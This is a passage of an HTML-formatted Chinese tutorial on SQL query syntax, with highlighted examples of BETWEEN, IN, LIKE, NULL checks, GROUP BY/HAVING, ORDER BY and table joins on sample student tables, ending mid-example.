&lt;p&gt;&lt;mark&gt;&lt;strong&gt;WHERE 列名 NOT BETWEEN 最小值 AND 最大值&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;eg.查询TAB1里面年级在1到3之间的学生的姓名：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Ch&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;BETWEEN&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;AND&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;3&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;eg.查询学号不在23000到24000之间的学生的姓名：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Ch&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;NOT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Nu&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;BETWEEN&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;23000&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;AND&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;24000&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;确定集合&#34;&gt;确定集合
&lt;/h4&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;WHERE 列名 IN (&amp;lsquo;列值1&amp;rsquo;,&amp;lsquo;列值n&amp;rsquo;)&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;WHERE 列名 NOT IN (&amp;lsquo;列值1&amp;rsquo;,&amp;lsquo;列值n&amp;rsquo;)&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;eg.查询学号不是23001也不是23002的学生年级：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Nu&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;NOT&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;IN&lt;/span&gt; (&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;23001&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;23002&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;相当于多重条件查询的=语句&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;字符匹配&#34;&gt;字符匹配
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;span style=&#34;color:orange&#34;&gt;百分号 % &lt;/span&gt;	表示任意长度的字符串(类似正则.*)，比如&lt;code&gt;a%b&lt;/code&gt;就是以a开头，b结尾的任意长度字符串&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span style=&#34;color:orange&#34;&gt;下划线 _ &lt;/span&gt;	  表示单个字符，比如&lt;code&gt;a_ _ _b&lt;/code&gt;（不用空格，这里方便看）是以a开头b结尾的长度为5的字符串&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;color:red&#34;&gt;&lt;strong&gt;在ASCII码表里，一个汉字长度为2，需要两个下划线&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span style=&#34;color:orange&#34;&gt;反斜杠 \ &lt;/span&gt; 	  表示转义，跟在 % 和 _ 前面（&lt;code&gt;\%&lt;/code&gt; 、&lt;code&gt;\_&lt;/code&gt;）让他们变成普通字符而非通配符&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;color:red&#34;&gt;&lt;strong&gt;使用 ESCAPE &amp;lsquo;符号&amp;rsquo; 设置转义字符，但一般使用反斜杠&lt;/strong&gt; &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;color:red&#34;&gt;&lt;strong&gt;根据环境决定要不要加上ESCAPE（有的数据库默认由\转义）&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;WHERE 列名 LIKE &amp;lsquo;字符串&amp;rsquo; ESCAPE &amp;lsquo;\&amp;rsquo;&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;WHERE 列名 NOT LIKE &amp;lsquo;字符串&amp;rsquo; ESCAPE &amp;lsquo;\&amp;rsquo;&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;eg.查询TAB1中姓名满足a%i_e的学生的年级：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Ch&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;LIKE&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;a%i_e&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;空值查询&#34;&gt;空值查询
&lt;/h4&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;WHERE 列名 IS NULL&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;WHERE 列名 IS NOT NULL&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;eg.查询TAB1中缺少学号的学生的年级：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Nu&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;IS&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;NULL&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;多重条件查询&#34;&gt;多重条件查询
&lt;/h4&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;WHERE 条件表达式1 AND 条件表达式2&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;WHERE 条件表达式1 OR 条件表达式2&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;可以把AND和OR组合使用，其中AND优先级大于OR&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;group-by-列名-having-条件表达式&#34;&gt;GROUP BY 列名 HAVING 条件表达式
&lt;/h3&gt;&lt;p&gt;&lt;span style=&#34;color:red;font-size:18px&#34;&gt;&lt;strong&gt;用于将查询结果按某一列或多列的值分组，值相等的为一组&lt;/strong&gt;&lt;/span&gt;
&lt;span style=&#34;color:red;font-size:18px&#34;&gt;&lt;strong&gt;目的是细化聚集函数的作用对象，分组后聚集函数将作用于每一个组，每一组都有一个函数值&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h4 id=&#34;group-by-列名&#34;&gt;GROUP BY 列名
&lt;/h4&gt;&lt;p&gt;eg.求TAB1表里面各个年级和对应的人数：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt;,&lt;span style=&#34;color:#c678dd&#34;&gt;COUNT&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;Ch&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;GROUP&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;BY&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;以Grade分组，在每一组中求取Ch的数量&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;group-by-列名-having-筛选条件&#34;&gt;GROUP BY 列名 HAVING 筛选条件
&lt;/h4&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;HAVING用于从组中选择满足条件的组&lt;/strong&gt;&lt;/mark&gt;
&lt;strong&gt;&lt;mark&gt;WHERE用于从基本表或视图中选择满足条件的元组（注意：WHERE子句不可以接聚集函数）&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;eg.求TAB1表里面各个年级和对应的人数：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt;,&lt;span style=&#34;color:#c678dd&#34;&gt;COUNT&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;Ch&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; .&lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;GROUP&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;BY&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;HAVING&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;GRADE&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;2&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;以Grade分组，在每一组中求取Ch的数量&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;order-by-次序&#34;&gt;ORDER BY 次序
&lt;/h3&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;ORDER BY 列名1 列名n ASC&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;ORDER BY 列名1 列名n DESC&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果不设置，默认升序（ASC）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;eg.查询TAB1中学生的年级，按照降序排列：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;ORDER&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;BY&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;GRADE&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;DESC&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;连接查询&#34;&gt;连接查询
&lt;/h3&gt;&lt;h4 id=&#34;两表连接查询&#34;&gt;两表连接查询
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;WHERE 表名1.列名1 比较运算符 表名2.列名2&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;当列名在参与连接的各表中唯一时，可省去表名前缀&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;eg.查询TAB1和TAB2中所有数据，并在一个查询结果里面展示&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;.&lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;TAB2&lt;/span&gt;.&lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;TAB2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Nu&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;TAB2&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Nu&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;若想获得自然连接，则列举全部属性列，并去掉一个相同的属性列即可。可以将上述SELECT语句改写如下：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Ch&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;Cla&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;Hom&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;TAB2&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Nu&lt;/span&gt;  &lt;span style=&#34;color:#7f848e&#34;&gt;-- 去掉了其中一个Nu
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;TAB2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Nu&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;TAB2&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Nu&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;eg.在TAB1和TAB2里查询选了英语课，并且是三年级的学生的学号:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Nu&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;tab2&amp;#34;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;CLA&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;ENGLISH&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;AND&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;GRADE&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;3&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;单表连接查询&#34;&gt;单表连接查询
&lt;/h4&gt;&lt;p&gt;&lt;span style=&#34;color:red;font-size:15px&#34;&gt;&lt;strong&gt;通过取两个别名，对同一个表进行自连接&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;eg.查询cla和cla2相同的学生学号：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;FIRST&lt;/span&gt;.&lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt;,&lt;span style=&#34;color:#c678dd&#34;&gt;SECOND&lt;/span&gt;.&lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;TAB2&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;FIRST&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;tab2&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;SECOND&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;FIRST&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;CLA&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SECOND&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;CLA2&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;外连接查询&#34;&gt;外连接查询
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;左外连接保留左表的所有记录，并尽可能地匹配右表中的记录&lt;/strong&gt;
&lt;strong&gt;右外连接保留右表的所有记录，并尽可能地匹配左表中的记录&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;color:red;font-size:15px&#34;&gt;&lt;strong&gt;将悬浮元组保留在结果关系中，没有属性值的位置填上NULL&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;mark&gt;SELECT 列名 FROM 表名1 LEFT OUTER JOIN 表名2 ON(连接条件)&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;mark&gt;SELECT 列名 FROM 表名1 RIGHT OUTER JOIN 表名2 ON(连接条件)&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;eg.以TAB1为主体，列出每个学生选课cla的结果&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Ch&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;CLA&lt;/span&gt;
